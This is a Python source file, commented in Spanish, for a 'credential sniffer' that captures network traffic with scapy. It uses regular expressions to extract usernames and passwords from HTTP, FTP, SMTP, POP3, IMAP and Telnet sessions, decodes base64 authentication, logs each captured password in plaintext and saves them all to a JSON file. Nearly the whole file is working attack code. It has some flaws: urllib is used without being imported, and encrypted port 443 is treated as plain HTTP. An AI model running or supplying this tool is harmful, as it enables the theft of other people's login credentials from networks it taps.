#!/usr/bin/env python3
"""
Credential Sniffer - Sniffer Real de Credenciales
Implementa sniffing real de credenciales usando scapy y análisis de tráfico
"""

import threading
import time
import re
import base64
import json
from typing import Dict, List, Any, Optional, Tuple
import logging
from datetime import datetime
import socket
import struct

class CredentialSniffer:
    """Sniffer real de credenciales en tráfico de red"""
    
    def __init__(self, interface: str = None):
        self.interface = interface
        self.logger = logging.getLogger('CredentialSniffer')
        self.sniffing = False
        self.credentials_found = []
        self.captured_packets = []
        
        # Patrones para diferentes protocolos
        self.protocol_patterns = {
            'http': {
                'auth_basic': r'Authorization:\s*Basic\s+([A-Za-z0-9+/=]+)',
                'auth_digest': r'Authorization:\s*Digest\s+([^\\r\\n]+)',
                'login_form': r'<form[^>]*action=["\']([^"\']*)["\'][^>]*>.*?<input[^>]*name=["\']([^"\']*username[^"\']*)["\'][^>]*>.*?<input[^>]*name=["\']([^"\']*password[^"\']*)["\'][^>]*>',
                'post_data': r'username=([^&]+)&password=([^&]+)',
                'json_login': r'"username":\s*"([^"]+)"[^}]*"password":\s*"([^"]+)"'
            },
            'ftp': {
                'user': r'USER\s+([^\\r\\n]+)',
                'pass': r'PASS\s+([^\\r\\n]+)'
            },
            'smtp': {
                'auth_plain': r'AUTH\s+PLAIN\s+([A-Za-z0-9+/=]+)',
                'auth_login': r'AUTH\s+LOGIN\s+([A-Za-z0-9+/=]+)',
                'username': r'[A-Za-z0-9+/=]+',
                'password': r'[A-Za-z0-9+/=]+'
            },
            'pop3': {
                'user': r'USER\s+([^\\r\\n]+)',
                'pass': r'PASS\s+([^\\r\\n]+)'
            },
            'imap': {
                'login': r'LOGIN\s+"([^"]+)"\s+"([^"]+)"',
                'authenticate': r'AUTHENTICATE\s+PLAIN\s+([A-Za-z0-9+/=]+)'
            },
            'telnet': {
                'login': r'login:\s*([^\\r\\n]+)',
                'password': r'password:\s*([^\\r\\n]+)'
            },
            'ssh': {
                'key_exchange': r'SSH-2\.0-([^\\r\\n]+)',
                'auth_request': r'SSH_MSG_USERAUTH_REQUEST'
            }
        }
    
    def start_sniffing(self, duration: int = 300, filter_expression: str = None) -> List[Dict[str, Any]]:
        """Inicia el sniffing de credenciales"""
        try:
            import scapy.all as scapy
            
            self.logger.info(f"Iniciando sniffing en interfaz {self.interface} por {duration} segundos")
            self.sniffing = True
            self.credentials_found = []
            
            # Filtro por defecto para capturar tráfico relevante
            if not filter_expression:
                filter_expression = "tcp port 80 or tcp port 443 or tcp port 21 or tcp port 22 or tcp port 23 or tcp port 25 or tcp port 110 or tcp port 143 or tcp port 993 or tcp port 995"
            
            # Iniciar sniffing en un hilo separado
            sniff_thread = threading.Thread(
                target=self._sniff_packets,
                args=(duration, filter_expression)
            )
            sniff_thread.daemon = True
            sniff_thread.start()
            
            # Esperar a que termine el sniffing
            sniff_thread.join()
            
            # Procesar paquetes capturados
            self._process_captured_packets()
            
            self.logger.info(f"Sniffing completado. {len(self.credentials_found)} credenciales encontradas")
            return self.credentials_found
            
        except ImportError:
            self.logger.error("Scapy no está instalado. Instala con: pip install scapy")
            return []
        except Exception as e:
            self.logger.error(f"Error iniciando sniffing: {e}")
            return []
    
    def _sniff_packets(self, duration: int, filter_expression: str):
        """Sniffea paquetes de red"""
        try:
            import scapy.all as scapy
            
            # Configurar sniffing
            scapy.conf.iface = self.interface if self.interface else scapy.conf.iface
            
            # Sniffear paquetes
            packets = scapy.sniff(
                filter=filter_expression,
                timeout=duration,
                prn=self._packet_handler,
                store=1
            )
            
            self.captured_packets = packets
            
        except Exception as e:
            self.logger.error(f"Error en sniffing: {e}")
    
    def _packet_handler(self, packet):
        """Maneja cada paquete capturado"""
        try:
            # Extraer información del paquete
            packet_info = self._extract_packet_info(packet)
            
            # Analizar contenido del paquete
            if packet_info:
                self._analyze_packet_content(packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error procesando paquete: {e}")
    
    def _extract_packet_info(self, packet) -> Optional[Dict[str, Any]]:
        """Extrae información relevante del paquete"""
        try:
            packet_info = {
                'timestamp': time.time(),
                'src_ip': None,
                'dst_ip': None,
                'src_port': None,
                'dst_port': None,
                'protocol': None,
                'payload': None
            }
            
            # Extraer información de IP
            if packet.haslayer('IP'):
                packet_info['src_ip'] = packet['IP'].src
                packet_info['dst_ip'] = packet['IP'].dst
                packet_info['protocol'] = packet['IP'].proto
            
            # Extraer información de TCP
            if packet.haslayer('TCP'):
                packet_info['src_port'] = packet['TCP'].sport
                packet_info['dst_port'] = packet['TCP'].dport
                
                # Extraer payload
                if packet.haslayer('Raw'):
                    packet_info['payload'] = packet['Raw'].load
            
            # Extraer información de UDP
            elif packet.haslayer('UDP'):
                packet_info['src_port'] = packet['UDP'].sport
                packet_info['dst_port'] = packet['UDP'].dport
                
                # Extraer payload
                if packet.haslayer('Raw'):
                    packet_info['payload'] = packet['Raw'].load
            
            return packet_info
            
        except Exception as e:
            self.logger.debug(f"Error extrayendo información del paquete: {e}")
            return None
    
    def _analyze_packet_content(self, packet_info: Dict[str, Any]):
        """Analiza el contenido del paquete en busca de credenciales"""
        if not packet_info.get('payload'):
            return
        
        try:
            payload = packet_info['payload']
            
            # Convertir a string si es bytes
            if isinstance(payload, bytes):
                try:
                    payload_str = payload.decode('utf-8', errors='ignore')
                except:
                    payload_str = str(payload)
            else:
                payload_str = str(payload)
            
            # Determinar protocolo basado en puerto
            protocol = self._detect_protocol(packet_info['dst_port'])
            
            if protocol:
                self._extract_credentials_from_protocol(payload_str, protocol, packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error analizando contenido: {e}")
    
    def _detect_protocol(self, port: int) -> Optional[str]:
        """Detecta el protocolo basado en el puerto"""
        protocol_ports = {
            21: 'ftp',
            22: 'ssh',
            23: 'telnet',
            25: 'smtp',
            80: 'http',
            110: 'pop3',
            143: 'imap',
            443: 'http',
            993: 'imap',
            995: 'pop3'
        }
        
        return protocol_ports.get(port)
    
    def _extract_credentials_from_protocol(self, payload: str, protocol: str, packet_info: Dict[str, Any]):
        """Extrae credenciales específicas del protocolo"""
        try:
            if protocol not in self.protocol_patterns:
                return
            
            patterns = self.protocol_patterns[protocol]
            
            # HTTP/HTTPS
            if protocol == 'http':
                self._extract_http_credentials(payload, packet_info)
            
            # FTP
            elif protocol == 'ftp':
                self._extract_ftp_credentials(payload, packet_info)
            
            # SMTP
            elif protocol == 'smtp':
                self._extract_smtp_credentials(payload, packet_info)
            
            # POP3
            elif protocol == 'pop3':
                self._extract_pop3_credentials(payload, packet_info)
            
            # IMAP
            elif protocol == 'imap':
                self._extract_imap_credentials(payload, packet_info)
            
            # Telnet
            elif protocol == 'telnet':
                self._extract_telnet_credentials(payload, packet_info)
            
            # SSH
            elif protocol == 'ssh':
                self._extract_ssh_credentials(payload, packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales {protocol}: {e}")
    
    def _extract_http_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae credenciales HTTP"""
        try:
            # Autenticación básica
            basic_auth_match = re.search(self.protocol_patterns['http']['auth_basic'], payload, re.IGNORECASE)
            if basic_auth_match:
                encoded_creds = basic_auth_match.group(1)
                try:
                    decoded_creds = base64.b64decode(encoded_creds).decode('utf-8')
                    if ':' in decoded_creds:
                        username, password = decoded_creds.split(':', 1)
                        self._add_credential('http_basic', username, password, packet_info)
                except:
                    pass
            
            # Autenticación digest
            digest_auth_match = re.search(self.protocol_patterns['http']['auth_digest'], payload, re.IGNORECASE)
            if digest_auth_match:
                digest_data = digest_auth_match.group(1)
                self._add_credential('http_digest', 'digest_auth', digest_data, packet_info)
            
            # Datos de formulario POST
            post_data_match = re.search(self.protocol_patterns['http']['post_data'], payload, re.IGNORECASE)
            if post_data_match:
                username = urllib.parse.unquote(post_data_match.group(1))
                password = urllib.parse.unquote(post_data_match.group(2))
                self._add_credential('http_post', username, password, packet_info)
            
            # JSON login
            json_login_match = re.search(self.protocol_patterns['http']['json_login'], payload, re.IGNORECASE)
            if json_login_match:
                username = json_login_match.group(1)
                password = json_login_match.group(2)
                self._add_credential('http_json', username, password, packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales HTTP: {e}")
    
    def _extract_ftp_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae credenciales FTP"""
        try:
            # Usuario FTP
            user_match = re.search(self.protocol_patterns['ftp']['user'], payload, re.IGNORECASE)
            if user_match:
                username = user_match.group(1).strip()
                # Buscar contraseña en el siguiente paquete o en el mismo
                pass_match = re.search(self.protocol_patterns['ftp']['pass'], payload, re.IGNORECASE)
                if pass_match:
                    password = pass_match.group(1).strip()
                    self._add_credential('ftp', username, password, packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales FTP: {e}")
    
    def _extract_smtp_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae credenciales SMTP"""
        try:
            # AUTH PLAIN
            auth_plain_match = re.search(self.protocol_patterns['smtp']['auth_plain'], payload, re.IGNORECASE)
            if auth_plain_match:
                encoded_creds = auth_plain_match.group(1)
                try:
                    decoded_creds = base64.b64decode(encoded_creds).decode('utf-8')
                    # AUTH PLAIN tiene formato: \0username\0password
                    parts = decoded_creds.split('\x00')
                    if len(parts) >= 3:
                        username = parts[1]
                        password = parts[2]
                        self._add_credential('smtp_plain', username, password, packet_info)
                except:
                    pass
            
            # AUTH LOGIN
            auth_login_match = re.search(self.protocol_patterns['smtp']['auth_login'], payload, re.IGNORECASE)
            if auth_login_match:
                encoded_creds = auth_login_match.group(1)
                try:
                    decoded_creds = base64.b64decode(encoded_creds).decode('utf-8')
                    self._add_credential('smtp_login', decoded_creds, '', packet_info)
                except:
                    pass
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales SMTP: {e}")
    
    def _extract_pop3_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae credenciales POP3"""
        try:
            # Usuario POP3
            user_match = re.search(self.protocol_patterns['pop3']['user'], payload, re.IGNORECASE)
            if user_match:
                username = user_match.group(1).strip()
                # Buscar contraseña
                pass_match = re.search(self.protocol_patterns['pop3']['pass'], payload, re.IGNORECASE)
                if pass_match:
                    password = pass_match.group(1).strip()
                    self._add_credential('pop3', username, password, packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales POP3: {e}")
    
    def _extract_imap_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae credenciales IMAP"""
        try:
            # LOGIN
            login_match = re.search(self.protocol_patterns['imap']['login'], payload, re.IGNORECASE)
            if login_match:
                username = login_match.group(1)
                password = login_match.group(2)
                self._add_credential('imap_login', username, password, packet_info)
            
            # AUTHENTICATE PLAIN
            auth_match = re.search(self.protocol_patterns['imap']['authenticate'], payload, re.IGNORECASE)
            if auth_match:
                encoded_creds = auth_match.group(1)
                try:
                    decoded_creds = base64.b64decode(encoded_creds).decode('utf-8')
                    parts = decoded_creds.split('\x00')
                    if len(parts) >= 3:
                        username = parts[1]
                        password = parts[2]
                        self._add_credential('imap_plain', username, password, packet_info)
                except:
                    pass
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales IMAP: {e}")
    
    def _extract_telnet_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae credenciales Telnet"""
        try:
            # Login
            login_match = re.search(self.protocol_patterns['telnet']['login'], payload, re.IGNORECASE)
            if login_match:
                username = login_match.group(1).strip()
                # Buscar contraseña
                pass_match = re.search(self.protocol_patterns['telnet']['password'], payload, re.IGNORECASE)
                if pass_match:
                    password = pass_match.group(1).strip()
                    self._add_credential('telnet', username, password, packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo credenciales Telnet: {e}")
    
    def _extract_ssh_credentials(self, payload: str, packet_info: Dict[str, Any]):
        """Extrae información SSH"""
        try:
            # SSH key exchange
            ssh_match = re.search(self.protocol_patterns['ssh']['key_exchange'], payload, re.IGNORECASE)
            if ssh_match:
                ssh_version = ssh_match.group(1)
                self._add_credential('ssh_info', 'ssh_version', ssh_version, packet_info)
            
            # SSH auth request
            auth_match = re.search(self.protocol_patterns['ssh']['auth_request'], payload, re.IGNORECASE)
            if auth_match:
                self._add_credential('ssh_info', 'auth_request', 'detected', packet_info)
                
        except Exception as e:
            self.logger.debug(f"Error extrayendo información SSH: {e}")
    
    def _add_credential(self, protocol: str, username: str, password: str, packet_info: Dict[str, Any]):
        """Añade credencial encontrada a la lista"""
        credential = {
            'protocol': protocol,
            'username': username,
            'password': password,
            'src_ip': packet_info.get('src_ip'),
            'dst_ip': packet_info.get('dst_ip'),
            'src_port': packet_info.get('src_port'),
            'dst_port': packet_info.get('dst_port'),
            'timestamp': datetime.now().isoformat(),
            'raw_packet': packet_info
        }
        
        # Evitar duplicados
        if credential not in self.credentials_found:
            self.credentials_found.append(credential)
            self.logger.info(f"Credencial encontrada: {protocol} - {username}:{password}")
    
    def _process_captured_packets(self):
        """Procesa todos los paquetes capturados"""
        try:
            for packet in self.captured_packets:
                packet_info = self._extract_packet_info(packet)
                if packet_info:
                    self._analyze_packet_content(packet_info)
                    
        except Exception as e:
            self.logger.error(f"Error procesando paquetes capturados: {e}")
    
    def get_network_interfaces(self) -> List[str]:
        """Obtiene lista de interfaces de red disponibles"""
        try:
            import scapy.all as scapy
            return scapy.get_if_list()
        except ImportError:
            return []
        except Exception as e:
            self.logger.error(f"Error obteniendo interfaces: {e}")
            return []
    
    def save_credentials(self, filename: str):
        """Guarda las credenciales encontradas en un archivo"""
        try:
            with open(filename, 'w') as f:
                json.dump(self.credentials_found, f, indent=2, default=str)
            
            self.logger.info(f"Credenciales guardadas en {filename}")
            
        except Exception as e:
            self.logger.error(f"Error guardando credenciales: {e}")
    
    def stop_sniffing(self):
        """Detiene el sniffing"""
        self.sniffing = False
        self.logger.info("Sniffing detenido")
